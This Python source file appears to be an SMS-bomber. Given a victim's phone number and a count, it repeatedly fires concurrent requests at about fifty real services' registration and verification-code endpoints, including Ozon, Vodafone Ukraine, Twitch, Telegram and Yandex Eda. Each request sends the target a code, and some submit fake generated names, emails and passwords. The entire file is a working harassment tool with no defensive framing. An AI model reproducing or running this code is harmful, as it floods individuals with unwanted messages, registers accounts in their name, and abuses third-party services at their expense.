import grequests
from information import *
import json
from tools.text import *
from time import sleep
from random import randint, choice
from tools.generate_info import GenerateInfo


def send_requests(phone: str, count: int):
    password = GenerateInfo().password()
    username = GenerateInfo().username()
    email = GenerateInfo().email()
    vodafone = (
        f"+{phone[:2]}("
        + f"{phone[2:5]}) "
        + f"{phone[5:8]}-" 
        + f"{phone[8:10]}-"
        + f"{phone[10:12]}"
    )
    russian_name = GenerateInfo().russian_name()
    iteration = 0
    while iteration < count:
        requests = [
            grequests.head(
                "https://secure.online.ua/ajax/check_phone/",
                params={"reg_phone": "+"+phone},
                headers=head,
            ),
            grequests.post(
                "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
                json={"phone": phone, "otpId": 0},
                headers=head,
            ),
            grequests.post(
                "http://www.vodafone.ua/shop/ru/vodafone_customer/register/sendSms/",
                data={
                    "is_ajax": "true",
                    "phone_number": vodafone,
                },
                headers=head,
            ),
            grequests.post(
                "https://uklon.com.ua/api/v1/account/code/send",
                headers=uklon1,
                json={"phone": phone},
            ),
            grequests.post(
                "https://partner.uklon.com.ua/api/v1/registration/sendcode",
                headers=uklon2,
                json={"phone": phone},
            ),
            grequests.post(
                "https://www.moyo.ua/identity/registration",
                data={
                    "firstname": russian_name,
                    "phone": phone,
                    "email": email,
                },
                headers=head,
            ),
            grequests.post(
                "https://koronapay.com/transfers/online/api/users/otps",
                data={"phone": phone},
                headers=head,
            ),
            grequests.post(
                "https://n13423.yclients.com/api/v1/book_code/312054",
                data=json.dumps({"phone": phone}),
                headers=frisor,
            ),
            grequests.post(
                "https://kasta.ua/api/v2/login/",
                data={"phone": phone},
                headers=head,
            ),
            grequests.post(
                "https://izi.ua/api/auth/register",
                json={
                    "phone": "+" + phone,
                    "name": russian_name,
                    "is_terms_accepted": "true",
                },
                headers=head,
            ),
            grequests.post(
                "https://junker.kiev.ua/postmaster.php",
                data={
                    "tel": phone[2:],
                    "name": username,
                    "action": "callme",
                },
                headers=head,
            ),
            grequests.post(
                "https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA",
                data={
                    "firstname": russian_name,
                    "telephone": phone,
                    "email": email,
                    "password": password,
                    "form_key": "Zqqj7CyjkKG2ImM8",
                },
                headers=head,
            ),
            grequests.post(
                "https://stores-api.zakaz.ua/user/signup/",
                json={"phone": phone},
                headers=zakaz,
            ),
            grequests.post(
                "https://youla.ru/web-api/auth/request_code",
                data={"phone": phone},
                headers=head,
            ),
            grequests.post(
                "https://cloud.mail.ru/api/v2/notify/applink",
                json={
                    "phone": "+" + phone,
                    "api": 2,
                    "email": email,
                    "x-email": "x-email",
                },
                headers=head,
            ),
            grequests.post(
                "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
                data={"phone": phone},
                headers=head,
            ),
            grequests.post(
                url=f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{phone}",
                headers=head,
            ),
            grequests.post(
                "https://crm.getmancar.com.ua/api/veryfyaccount",
                json={
                    "phone": "+" + phone,
                    "grant_type": "password",
                    "client_id": "gcarAppMob",
                    "client_secret": "SomeRandomCharsAndNumbersMobile",
                },
                headers=head,
            ),
            grequests.post(
                "https://www.icq.com/smsreg/requestPhoneValidation.php",
                data={
                    "msisdn": phone,
                    "locale": "en",
                    "countryCode": "ru",
                    "version": "1",
                    "k": "ic1rtwz1s1Hj1O0r",
                    "r": "46763",
                },
                headers=head,
            ),
            grequests.post(
                "https://api.pozichka.ua/v1/registration/send",
                json={"RegisterSendForm": {"phone": "+" + phone}},
                headers=head,
            ),
            grequests.post(
                "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
                params={"oper": 9, "callmode": 1, "phone": "+" + phone},
                headers=head,
            ),
            grequests.post(
                "https://city24.ua/personalaccount/account/registration",
                data={"PhoneNumber": phone},
                headers=head,
            ),
            grequests.post(
                "https://helsi.me/api/healthy/accounts/login",
                json={"phone": phone, "platform": "PISWeb"},
                headers=head,
            ),
            grequests.post(
                "https://cloud.mail.ru/api/v2/notify/applink",
                json={"phone": "+" + phone, "api": 2, "email": email},
                headers=head,
            ),
            grequests.post(
                "https://auth.multiplex.ua/login",
                json={"login": phone},
                headers=head,
            ),
            grequests.post(
                "https://account.my.games/signup_send_sms/",
                data={"phone": phone},
                headers=head,
            ),
            grequests.post(
                "https://cabinet.planetakino.ua/service/sms",
                params={"phone": phone},
                headers=head,
            ),
            grequests.post(
                "https://youla.ru/web-api/auth/request_code",
                data={"phone": phone},
                headers=head,
            ),
            grequests.post(
                "https://rutube.ru/api/accounts/sendpass/phone",
                data={"phone": "+" + phone},
                headers=head,
            ),
            grequests.post(
                "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
                params={"pageName": "registerPrivateUserPhoneVerificatio"},
                data={"phone": phone, "recaptcha": "off", "g-recaptcha-response": ""},
                headers=head,
            ),
            grequests.post(
                "https://passport.twitch.tv/register?trusted_request=true",
                json={
                    "birthday": {"day": 12, "month": 10, "year": 2000},
                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                    "include_verification_code": True,
                    "password": password,
                    "phone_number": phone,
                    "username": username,
                },
                headers=head,
            ),
            grequests.post(
                "https://lk.belkacar.ru/register",
                data={"phone": "+" + phone},
                headers=head,
            ),
            grequests.post(
                "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                data={"phone": phone},
                headers=head,
            ),
            grequests.post(
                "https://lk.belkacar.ru/get-confirmation-code",
                data={"phone": "+" + phone},
                headers=head,
            ),
            grequests.post(
                "https://secure.online.ua/ajax/check_phone/",
                params={"reg_phone": phone},
                header=head,
            ),
            grequests.post(
                "https://api.delitime.ru/api/v2/signup",
                data={"SignupForm[username]": phone, "SignupForm[device_type]": 3},
                headers=head,
            ),
            grequests.post(
                "https://apteka366.ru/login/register/sms/send",
                data={"phone": phone},
                headers=head,
            ),
            grequests.head(
                "https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}".format(
                    "+" + phone
                ),
                headers=head,
            ),
            grequests.post(
                "https://gorzdrav.org/login/register/sms/send",
                data={"phone": phone},
                headers=head,
            ),
            grequests.post(
                "https://eda.yandex/api/v1/user/request_authentication_code",
                json={"phone_number": phone},
                headers=head,
            ),
            grequests.post(
                "https://eda.yandex/api/v1/user/request_authentication_code",
                json={"phone_number": "+" + phone},
                headers=head,
            ),
            grequests.post(
                "https://my.dianet.com.ua/send_sms/",
                data={"phone": phone},
                headers=head,
            ),
            grequests.post(
                "https://shafa.ua/api/v3/graphiql",
                json={
                    "operationName": "RegistrationSendSms",
                    "variables": {"phoneNumber": "+" + phone},
                    "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
                },
                headers=head,
            ),
            grequests.post(
                "https://my.telegram.org/auth/send_password",
                data={"phone": "+" + phone},
                headers=head,
            ),
            grequests.head(
                f"https://cabinet.planetakino.ua/service/sms?phone={phone}",
                headers=head,
            ),
            grequests.post(
                "https://api.boosty.to/oauth/phone/authorize",
                data={"client_id": "+" + phone},
                headers=head,
            ),
            grequests.post(
                "https://md-fashion.com.ua/bpm/validate-contact",
                data={"phone": "+" + phone},
                headers=head,
            ),
        ]
        grequests.map(requests, gtimeout=5)
        # grequests.imap(requests, exception_handler=exception_handler)
        iteration += 1

        if iteration >= 5 and count >= 10:
            sleep(randint(2, 4))

        print(
            f"\033[1;{choice(['32m', '33m', '34m', '35m', '36m'])}{iteration}/{count} кругов"
        )
